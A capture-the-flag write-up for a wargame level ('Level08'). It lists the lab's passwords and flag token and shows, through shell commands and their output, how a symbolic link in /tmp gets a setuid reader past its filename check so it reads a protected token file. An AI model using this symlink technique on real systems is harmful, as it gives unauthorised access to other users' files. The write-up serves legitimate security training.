# Level08 - Flag08

## Local script usage

```shell
Usage: ./Ressources/main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level08 | `fiumuikeil55xe9cu4dood66h` |
| flag08  | `quif5eloekouj29ke0vouxean` |
| token   | `25749xKZ8L7DkSCwJkT9dyv6f` |

## Steps to resolve on VM

1. Connect to `level08` user and notice there is an executable and a token file owned by `flag08` user

```bash
su level08
# Enter the token

ls -l
> -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
> -rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

2. Check the files

```bash
./level08
> ./level08 [file to read]

./level08 token
> You may not access 'token'

echo "test" > /tmp/test
./level08 /tmp/test
> test

echo "test" > /tmp/token
./level08 /tmp/token
> You may not access '/tmp/token'

# We can see it doesn't let us acces any file that is named "token"

# We can't neither copy it or rename it because of access denial
cp token test
> cp: cannot open 'token' for reading: Permission denied

# Let's try symbolic link then
```

3. Exploit with symlink

```bash
ln -s ~/token /tmp/link

./level08 /tmp/link
> quif5eloekouj29ke0vouxean

su flag08
# Enter password
> Don t forget to launch getflag !

getflag
> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

---

## Sources

### SHELL

- [Symlink](https://kb.iu.edu/d/abbe)
